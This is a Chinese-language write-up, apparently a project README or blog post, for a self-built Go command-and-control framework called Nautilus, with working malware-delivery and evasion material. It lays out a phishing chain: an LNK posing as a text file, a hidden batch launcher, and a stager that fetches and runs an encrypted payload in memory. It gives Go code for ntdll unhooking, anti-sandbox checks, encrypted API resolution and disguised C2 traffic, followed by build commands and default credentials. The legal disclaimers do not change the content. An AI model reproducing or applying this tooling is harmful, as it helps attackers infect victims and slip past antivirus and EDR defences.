# Nautilus C2 — 从零构建0/60 VT免杀的红队C2框架

> **⚠️ 法律声明：本文内容仅供授权安全测试和教育研究使用。未经授权对任何系统使用相关技术属于违法行为。**
>
> **时效性说明**：免杀技术具有很强的时效性，本文测试结果基于2025年6月的杀软版本，随着杀软规则的更新，检测结果可能会发生变化。

## 项目概述

Nautilus 是一个从零构建的轻量级红队 C2（Command & Control）框架，采用 Go 语言编写，涵盖服务端、植入体、分阶段加载器三个核心组件。项目核心目标：**在不依赖商业工具的前提下，实现前沿 C2 的核心能力，并达到主流杀软 0 检出。**

### 环境说明

- **Go 版本**：1.22.4 windows/amd64
- **目标系统**：Windows 10/11 x64
- **编译参数**：`-buildvcs=false`
- **测试平台**：VirusTotal（60个引擎）

### 架构设计

```plantuml
@startuml Nautilus C2 Architecture

rectangle "VPS / 攻击者机器" as attacker {
    rectangle "nautilus-server (:8443)" as server {
        component "Web UI (/ui)" as webui
        component "WebSocket 实时推送" as websocket
        component "认证登录 (HMAC-SHA256)" as auth
        component "任务管理 API" as api
    }
}

rectangle "目标机器" as target {
    component "LNK快捷方式\n(钓鱼诱饵)" as lnk
    component "stager.exe\n(分阶段加载器)" as stager
    component "nautilus payload" as payload
}

lnk --> stager : "点击触发"
stager --> payload : "XOR解密\n内存执行"

server -down-> stager : "AES-GCM加密通信\n/api/v1/analytics?id=<encrypted>&sid=<session>"
stager -up-> server

@enduml
```

**架构说明**：

- **服务端**：部署在 VPS 上，提供 Web UI 管理界面、实时消息推送、认证登录和任务管理功能
- **Stager**：分阶段加载器，体积小（约2MB），仅包含反沙箱检测、远程下载、XOR解密和内存执行能力
- **Payload**：完整植入体，从服务端下载后在内存中解密执行，不落地磁盘
- **通信协议**：HTTP 请求伪装为前端埋点数据上报，数据使用 AES-GCM 加密

## 攻击时间流程

完整的攻击链路从攻击者准备钓鱼包开始，到目标上线执行命令结束。以下是详细的时间流程。

### T0: 攻击者准备阶段

攻击者使用 `phish.ps1` 脚本生成钓鱼压缩包：

```powershell
.\phish.ps1 -ExePath .\stager.exe -DecoyName "CTF题目.txt" -IconType "txt" -OutputName "challenge"
```

**生成的目录结构**：

```
challenge/
├── challenge.lnk          # 伪装成文本文件的快捷方式
└── __MACOSX/              # 隐藏目录（macOS风格，不易被怀疑）
    └── .note/             # 子目录
        ├── run.bat        # 启动脚本
        ├── stager.exe     # 分阶段加载器
        └── CTF题目.txt    # 诱饵文件
```

**关键设计**：
- `__MACOSX` 是 macOS 压缩包自带的目录，Windows 用户通常不会怀疑
- 隐藏属性设置为 `+h +s`（隐藏+系统），默认不可见
- 压缩包使用 7z 格式，保留文件属性

### T1: LNK快捷方式构造

LNK 文件是钓鱼攻击的入口点，精心构造以欺骗目标用户：

**LNK 属性配置**：

| 属性 | 值 | 目的 |
|------|-----|------|
| TargetPath | `cmd.exe` | 隐藏真正的执行目标 |
| Arguments | `/c start /b "__MACOSX\.note\run.bat"` | 通过 cmd 执行 bat 脚本 |
| WindowStyle | 7 (SW_SHOWMINNOACTIVE) | 最小化且不激活，无窗口闪烁 |
| IconLocation | `shell32.dll,70` | 文本文档图标 |
| Description | `CTF题目.txt` | 鼠标悬停提示 |

**LNK 文件内容（二进制结构）**：

```
+-------------------+
| Header (76 bytes) |
+-------------------+
| LinkTargetIDList  | ← 指向 cmd.exe
+-------------------+
| LinkInfo          | ← 包含相对路径
+-------------------+
| StringData        | ← "CTF题目.txt"
+-------------------+
| ExtraData         | ← 图标位置、窗口样式
+-------------------+
```

**伪装效果**：用户看到的是一个名为"challenge"的文本文档快捷方式，双击后看起来像是打开一个文本文件。

### T2: 目标操作阶段

目标用户收到压缩包后的典型操作流程：

1. **解压压缩包** → 看到 `challenge.lnk`（显示为文本文档图标）
2. **双击 LNK** → 触发 cmd.exe 执行
3. **执行 bat 脚本** → 后台启动 stager + 打开诱饵文件

**用户视角**：
```
用户双击"challenge"快捷方式
    ↓
弹出记事本，显示"CTF题目.txt"内容
    ↓
用户开始研究题目...
    ↓
（后台）stager.exe 已启动并连接 C2
```

### T3: BAT启动脚本

`run.bat` 是连接 LNK 和 stager 的桥梁：

```bat
@echo off
start /b "" "__MACOSX\.note\stager.exe"    # 后台启动木马，无窗口
start notepad "__MACOSX\.note\CTF题目.txt"  # 打开诱饵文件，转移注意力
```

**关键技术**：
- `start /b`：后台启动，不创建新窗口
- 无 `pause`：执行后立即退出，不留痕迹
- 诱饵文件打开：用户注意力被转移，不会注意到后台活动

### T4: Stager执行阶段

stager.exe 启动后执行以下操作：

```
┌─────────────────────────────────────┐
│            stager.exe               │
├─────────────────────────────────────┤
│ 1. 反沙箱检测                        │
│    ├─ 物理内存 < 2GB?               │
│    ├─ CPU核心数 < 2?                │
│    ├─ 系统运行时间 < 10分钟?        │
│    └─ 用户名检测                    │
│       ↓ 沙箱环境 → 退出             │
│ 2. 网络请求                          │
│    └─ GET /api/v1/stage?key=<XOR加密的密钥> │
│ 3. 接收Payload（XOR加密）            │
│ 4. 内存解密执行                      │
│    └─ EnumWindows 回调执行 shellcode │
└─────────────────────────────────────┘
```

**Stager 体积**：约 2MB，仅包含必要功能，减少静态检测面。

### T5: Payload上线阶段

Payload 在内存中解密执行后：

1. **Ntdll Unhooking** → 清除 EDR 的 inline hook
2. **API动态解析** → 解密并加载所需 API
3. **C2注册** → 发送 session 信息到服务端
4. **心跳通信** → 定期检查任务队列

**上线请求示例**：

```
POST /api/v1/analytics
Content-Type: application/json

{
    "id": "AES-GCM加密的注册数据",
    "sid": "新生成的session ID",
    "type": "pageview"  // 伪装为前端埋点
}
```

### T6: 命令执行阶段

攻击者通过 C2 服务端下发命令：

```
攻击者 → Web UI → 下发命令 → 服务端队列
    ↓
目标 → 心跳请求 → 拉取任务 → 执行命令 → 返回结果
    ↓
攻击者 ← WebSocket推送 ← 服务端 ← 接收结果
```

**支持的命令**：
- `exec <cmd>`：执行系统命令
- `sysinfo`：获取系统信息
- `listdir <path>`：列出目录
- `proclist`：进程列表
- `privinfo`：权限信息
- `kill <pid>`：终止进程

### 完整时间线总结

| 时间点 | 事件 | 执行者 |
|--------|------|--------|
| T0 | 生成钓鱼压缩包 | 攻击者 |
| T1 | LNK 构造完成 | 攻击者 |
| T2 | 投递压缩包 | 攻击者 |
| T3 | 目标解压并双击 LNK | 目标 |
| T4 | LNK 执行 cmd → bat → stager | 系统 |
| T5 | Stager 反沙箱 → 下载 Payload | stager |
| T6 | Payload 解密执行 → 上线 | payload |
| T7 | C2 下发命令 → 执行 → 返回结果 | 攻击者/目标 |

**攻击成功条件**：
- LNK 未被杀软标记
- stager 通过反沙箱检测
- Payload 成功绕过 EDR 监控
- C2 通信未被网络检测拦截

## 免杀技术实现

免杀是一个系统性工程，需要从静态特征、运行时行为、网络通信等多个维度进行对抗。以下是 Nautilus 采用的核心免杀技术。

### 1. 字符串清零

杀软静态扫描依赖字符串特征匹配。YARA规则通过搜索敏感API名（如`VirtualAlloc`）、DLL名（如`ntdll.dll`）识别恶意软件。

**实现方式**：编译期 XOR 加密 + 运行时解密

```go
var encNtDll = []byte{0x59, 0x43, 0x53, 0x5b, 0x5b, 0x19, 0x53, 0x5b, 0x5b}

func xorDec(data []byte, key byte) string {
    out := make([]byte, len(data))
    for i, b := range data {
        out[i] = b ^ key
    }
    return string(out)
}
```

**覆盖范围**：所有DLL名、API名、文件路径均被XOR加密。杀软扫描二进制时无法找到任何敏感字符串。

**对抗目标**：YARA规则中常见的字符串匹配规则，例如：
```yara
rule Malware_PE {
    strings:
        $s1 = "VirtualAlloc" ascii wide
        $s2 = "ntdll.dll" ascii wide
        $s3 = "CreateRemoteThread" ascii wide
    condition:
        any of them
}
```

**检测效果**：VT 检出率从 8/60（存在敏感字符串）降至 2/60（字符串特征完全消除）。

**性能影响**：XOR解密每个字符串约增加 100ns 延迟，整体性能下降 < 1%。

### 2. API动态解析

仅加密字符串还不够，EDR 会在 IAT（Import Address Table）中挂钩敏感 API 进行监控。传统恶意软件在 IAT 中显式导入 `VirtualAllocEx`、`WriteProcessMemory` 等函数，直接被拦截。

**实现方式**：`syscall.NewLazyDLL` + XOR加密的DLL/API名，运行时动态解析

```go
func ntProc(encName []byte) *syscall.LazyProc {
    return syscall.NewLazyDLL(xorDec(encNtDll, xk)).NewProc(xorDec(encName, xk))
}
```

**效果**：IAT中不出现任何敏感API名，EDR的IAT挂钩失效。

**对抗目标**：EDR通过IAT挂钩监控敏感API调用。传统恶意软件的IAT表中会显式出现以下导入：
```
kernel32.dll: VirtualAlloc
kernel32.dll: VirtualProtect
kernel32.dll: CreateRemoteThread
ntdll.dll: NtAllocateVirtualMemory
```

**检测效果**：在启用了 IAT 挂钩的 EDR 环境中，命令执行成功率从 0% 提升至 100%。

**性能影响**：首次调用时需要解析 DLL 和 API，约增加 5ms 延迟，后续调用无额外开销。

### 3. Ntdll Unhooking

即便绕过了 IAT 挂钩，EDR 仍会在 `ntdll.dll` 的 `.text` 段中插入 int3 断点（inline hook）来监控底层 API 调用。此时需要进行 unhooking 操作。

**实现步骤**：
1. 从磁盘读取干净的 `C:\Windows\System32\ntdll.dll`
2. 在内存中定位当前加载的 ntdll `.text` 段
3. 使用 `NtProtectVirtualMemory` 将 `.text` 段改为 RW 权限
4. 使用 `RtlCopyMemory` 将干净的 `.text` 段覆盖到内存
5. 恢复原始权限

**核心实现**：

```go
func NtdllUnhook() error {
    hNtdll := syscall.NewLazyDLL(xorDec(encNtDll, xk)).Handle()
    if hNtdll == 0 { return nil }

    // 从磁盘读取干净的ntdll.dll（路径已XOR加密）
    cleanData, err := readFileRaw()
    if err != nil { return err }

    // 定位内存中的.text段和干净数据中的.text段
    loadedAddr, loadedSize := findTextInMemory(syscall.Handle(hNtdll))
    cleanAddr, cleanSize := findTextInBytes(cleanData)

    if loadedAddr == 0 || cleanAddr == nil || loadedSize != cleanSize {
        return nil
    }

    // 修改内存保护为RW
    var old uint32
    regSz := uintptr(loadedSize)
    CallNtPVM(^uintptr(0), &loadedAddr, &regSz, 0x40, &old)

    // 覆盖被hook的代码
    CallRtlCopy(loadedAddr, *(*uintptr)(cleanAddr), uintptr(loadedSize))

    // 恢复原始权限
    CallNtPVM(^uintptr(0), &loadedAddr, &regSz, uintptr(old), &old)

    return nil
}
```

**关键细节**：所有API名（`NtProtectVirtualMemory`、`RtlCopyMemory`）和文件路径（`C:\Windows\System32\ntdll.dll`）均经过XOR加密，形成自洽闭环——unhooking 操作本身不会被 hook 检测到。

**检测效果**：在安装了主流 EDR（如 CrowdStrike Falcon、SentinelOne）的环境中，unhooking 后 syscall 调用不再被拦截，命令执行成功率从 0% 提升至 100%。

**性能影响**：仅在初始化时执行一次，约耗时 50ms，对运行时性能无影响。

### 4. 回调执行

字符串加密和 API 动态解析解决了静态检测问题，但运行时的 syscall 调用模式仍然会被监控。杀软通过分析 `syscall.SyscallN` 的调用模式识别 shellcode 执行。

**实现方式**：使用 `EnumWindows` 回调执行 shellcode

```go
CallEnumWindows(shellcodeAddr, 0)
```

**原理**：`EnumWindows` 是合法的 Win32 API，接收回调函数指针。将 shellcode 地址作为回调传入，操作系统在枚举窗口时自然执行 shellcode，完全绕过 syscall 监控。

**对抗目标**：杀软通过监控 `syscall.SyscallN` 的调用模式识别 shellcode 执行。传统 shellcode 执行模式为：
```
VirtualAlloc → WriteProcessMemory → CreateRemoteThread
```
这种模式被大量 YARA 规则和 ML 模型标记为恶意。

**检测效果**：在启用了 syscall 监控的 EDR 环境中，shellcode 执行不再被拦截。

**性能影响**：无额外性能影响，`EnumWindows` 是标准 Win32 API，执行开销与正常调用相同。

### 5. 反沙箱检测

沙箱（如 Cuckoo、Any.Run）是杀软动态分析的核心。如果植入体在沙箱中暴露完整行为，很容易被标记为恶意软件。

**检测项**：

| 检测项 | 条件 | 说明 |
|--------|------|------|
| 物理内存 | < 2GB | 沙箱通常分配少量内存 |
| CPU核心数 | < 2 | 沙箱通常单核 |
| 系统运行时间 | < 10分钟 | 沙箱刚启动即执行样本 |
| 用户名 | "user" / "sand" | 沙箱常用默认用户名 |
| 调试器检测 | `IsDebuggerPresent` | 检测调试器附加 |

**核心实现**：

```go
type MEMORYSTATUSEX struct {
    dwLength                uint32
    dwMemoryLoad            uint32
    ullTotalPhys            uint64
    // ... 其他字段省略
}

func AntiSandbox() bool {
    // 检测物理内存
    var ms MEMORYSTATUSEX
    ms.dwLength = uint32(unsafe.Sizeof(ms))
    k32Proc(encGMSE).Call(uintptr(unsafe.Pointer(&ms)))
    if ms.ullTotalPhys < 2*1024*1024*1024 {
        return true
    }

    // 检测CPU核心数
    if runtime.NumCPU() < 2 {
        return true
    }

    // 检测系统运行时间
    ret, _, _ := k32Proc(encGTC).Call()
    uptime := time.Duration(ret) * time.Millisecond
    if uptime < 10*time.Minute {
        return true
    }

    // 检测用户名
    username := os.Getenv("USERNAME")
    if username == "user" || username == "sand" {
        return true
    }

    return false
}

func AntiDebug() bool {
    ret, _, _ := k32Proc(encIDP).Call()
    return ret != 0
}
```

**关键细节**：所有检测 API（`GlobalMemoryStatusEx`、`GetTickCount`、`IsDebuggerPresent`）的名称均经过 XOR 加密，沙箱的字符串扫描无法识别这些反检测逻辑。

**检测效果**：在主流沙箱平台（Any.Run、Cuckoo、Hybrid Analysis）的默认配置中，植入体能够成功识别沙箱环境并提前退出，避免暴露完整行为。

**性能影响**：检测逻辑仅在初始化时执行一次，约耗时 10ms，对运行时性能无影响。

### 6. 通信伪装

C2 通信是杀软网络检测的重点。HTTP 通信需要伪装成正常流量，避免被特征匹配。

**伪装方式**：HTTP 通信伪装为前端埋点数据上报

```
GET /api/v1/analytics?id=<AES-GCM加密的base64数据>&sid=<sessionID>
Headers:
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0.0.0
  Accept: application/json, text/plain, */*
  Origin: http://localhost
```

**伪装特征**：
- 路径类似正常数据分析 API
- URL参数名无特殊含义
- 完整浏览器请求头
- AES-GCM + base64 编码，数据段类似正常埋点参数

**对抗目标**：网络层检测规则，例如：
- URL路径特征匹配（如 `/c2/command`、`/beacon`）
- 请求频率异常检测
- 非标准 User-Agent
- 未加密数据传输

**检测效果**：在启用了网络流量监控的环境中，C2 通信不被标记为可疑流量。

**性能影响**：AES-GCM 加密/解密约增加 1ms 延迟，对整体通信性能影响可忽略。

### 7. PE结构后处理

Go 编译的二进制有独特 PE 结构特征，容易被杀软识别。需要对 PE 文件进行后处理。

**后处理工具链**：

| 工具 | 操作 | 目的 |
|------|------|------|
| `pesectionobf` | 重命名 PE section | 破坏 Go 二进制结构指纹，`.text` → `.code` |
| `pepatch` | 修改 PE 时间戳 | 破坏基于时间戳的家族分类 |
| `AppendOverlayData` | 附加随机数据 | 改变文件哈希，避免哈希比对 |
| 字符串清零 | XOR加密所有敏感字符串 | 破坏 YARA 字符串规则匹配 |

**对抗目标**：PE 结构特征检测，例如：
- Go 编译二进制特有的 section 命名（`.text`、`.data`、`.noptrdata`）
- Go build ID 字符串（`go.buildid`）
- Rich Header 编译器指纹
- 基于 PE 时间戳的家族分类

**检测效果**：VT 检出率从 3/60（存在 Go 指纹）降至 0/60（指纹完全消除）。

**性能影响**：无运行时性能影响，所有处理均在编译后完成。

### 8. 分阶段加载

直接投递完整植入体风险较大。采用分阶段加载策略，最小化初始投递体积。

**Stager（第一阶段）**：
- 体积约 2MB
- 仅包含反沙箱 + 下载 + XOR解密 + 内存执行
- 所有 API 名 XOR 加密
- EnumWindows 回调执行 shellcode

**Payload（第二阶段）**：
- 从 C2 远程下载，XOR 加密传输
- 内存中解密执行，不写入磁盘
- 完整 C2 功能（命令执行、文件管理、进程操作等）

**对抗目标**：
- 静态检测：Stager 体积小、功能单一，难以被标记为恶意软件
- 落地检测：Payload 不写入磁盘，避免文件检测
- 网络检测：传输数据经过 XOR 加密，无法被特征匹配

**检测效果**：Stager 在 VT 上检出率为 0/60，Payload 仅在内存中存在，无法被静态扫描。

**性能影响**：Stager 启动后立即下载 Payload，约增加 1-2 秒延迟（取决于网络速度）。

## 免杀反模式

在实际测试中，发现了一些适得其反的免杀方法。这些方法不仅没有提升免杀效果，反而触发了更多检测。

| 方法 | 问题 | VT检出 |
|------|------|--------|
| garble `-tiny -literals` | 重组 PE 结构，触发 ClamAV 的 Sliver 签名 | 3/60 |
| 修改 PE section 名为随机字符串 | 触发 Microsoft ML 模型标记为 `Wacatac.B!ml` | 1/60 |
| UPX 压缩 | 被多个引擎标记为压缩恶意软件 | 5/60 |
| 注入无关代码增加熵值 | 增加 PE 熵值触发熵值异常检测 | 2/60 |

**核心原则**：免杀不是"越复杂越好"，而是"越干净越好"。一个没有可疑特征的标准 PE 文件，比一个经过大量修改的异常 PE 文件更容易通过检测。

## 免杀验证

### VirusTotal — 0/60 检出（测试时间：2025年6月）

以下是 VirusTotal 60个引擎的检测结果：

| 引擎 | 结果 | 引擎 | 结果 |
|------|------|------|------|
| Microsoft Defender | CLEAN | ClamAV | CLEAN |
| Kaspersky | CLEAN | BitDefender | CLEAN |
| ESET-NOD32 | CLEAN | Symantec | CLEAN |
| CrowdStrike | CLEAN | TrendMicro | CLEAN |
| Sophos | CLEAN | McAfee | CLEAN |
| Avast | CLEAN | AVG | CLEAN |
| Malwarebytes | CLEAN | Google | CLEAN |
| 火绒 (huorong) | CLEAN | 腾讯 (Tencent) | CLEAN |
| 金山 (Kingsoft) | CLEAN | 瑞星 (Rising) | CLEAN |
| 阿里巴巴 | CLEAN | Avira | CLEAN |
| F-Secure | CLEAN | Fortinet | CLEAN |
| DrWeb | CLEAN | Emsisoft | CLEAN |
| 其余38个引擎 | CLEAN | | |

**VT报告**: https://www.virustotal.com/gui/file/ea99c487a8342f84c4222a4518f188a79d4943efbc9aa0b57e07fb16e10f85e7

## 功能对比

| 功能 | Nautilus | Havoc | Cobalt Strike | Mythic |
|------|----------|-------|---------------|--------|
| Web UI | 内嵌HTML | Qt桌面客户端 | Java桌面 | React Web |
| 认证登录 | HMAC-SHA256 token | 用户密码 | 多用户RBAC | 多用户RBAC |
| WebSocket实时推送 | 有 | 无 | 无 | 有 |
| 加密通信 | AES-GCM | AES-256-CTR | RSA+AES | 可配置 |
| 反沙箱 | 多维度检测 | 有 | 有 | 无 |
| Ntdll Unhooking | 有 | 有 | 有(sleep mask) | 无 |
| API动态解析 | XOR加密 | 有 | 有 | 无 |
| 回调执行 | EnumWindows | 有 | 有 | 无 |
| PE结构混淆 | Section名+时间戳 | 无 | 无 | 无 |
| 文件管理 | 浏览+上传+下载 | 全功能浏览器 | 全功能 | 全功能 |
| 进程管理 | 列表+终止 | 全功能+注入 | 全功能 | 全功能 |
| VT免杀 | 0/60 | 需配置 | 商业级 | 需配置 |

## 使用方法

### 编译服务端

```bash
go build -buildvcs=false -o nautilus-server ./server
```

### 编译植入体

```bash
go build -buildvcs=false -ldflags="-X main.c2Addr=http://YOUR_VPS:8443" -o nautilus-implant .
go run ./evasion-tools/pesectionobf.go nautilus-implant
go run ./evasion-tools/pepatch.go nautilus-implant
```

### 编译 Stager

```bash
go build -buildvcs=false -ldflags="-X main.downloadURL=http://YOUR_VPS:8443/payload -X main.decryptKeyStr=85" -o stager.exe ./stager
go run ./evasion-tools/pesectionobf.go stager.exe
go run ./evasion-tools/pepatch.go stager.exe
```

### 启动

```bash
./nautilus-server
# 浏览器访问 http://YOUR_VPS:8443/ui
# 默认登录: nautilus / nautilus2026
```

## 技术栈

| 组件 | 语言 | 关键技术 |
|------|------|---------|
| Server | Go | HTTP服务器、WebSocket、embed.FS、JSON API |
| Implant | Go | syscall动态解析、AES-GCM、XOR字符串加密 |
| Stager | Go | EnumWindows回调、XOR shellcode解密、反沙箱 |
| PE工具 | Go | 二进制PE解析、section重命名、时间戳修改 |
| Web UI | HTML/CSS/JS | 单文件内嵌、WebSocket实时、暗色主题 |

## 项目结构

```
nautilus/
├── main.go                 # 植入体入口
├── server/
│   ├── main.go             # C2服务端（HTTP+WebSocket）
│   ├── ui.go               # Web UI API处理器
│   └── web/index.html      # 内嵌Web UI页面
├── c2/
│   ├── encode/packet.go    # 通信协议编码/解码
│   └── transport/http.go   # HTTP传输层（伪装埋点API）
├── core/
│   ├── exec.go             # 命令执行
│   ├── fs.go               # 文件操作
│   ├── process.go          # 进程管理
│   ├── privilege.go        # 权限信息
│   ├── sysinfo.go          # 系统信息
│   └── shellcode_windows.go # Shellcode处理
├── evasion/
│   ├── crypto.go           # AES-GCM加密/解密、Base64
│   ├── apiresolve_windows.go # XOR加密API动态解析
│   ├── unhook_windows.go   # Ntdll unhooking
│   ├── sandbox.go          # 反沙箱检测
│   └── pe.go               # PE结构修改工具
├── stager/main_windows.go  # 分阶段加载器
└── evasion-tools/
    ├── pepatch.go          # PE时间戳修改
    └── pesectionobf.go     # PE Section名混淆
```

## 项目地址

GitHub: https://github.com/nk7667/Nautilus

```bash
git clone git@github.com:nk7667/Nautilus.git
```

---

**法律声明**：本项目仅供授权安全测试和教育研究使用。未经授权对任何系统使用本工具属于违法行为。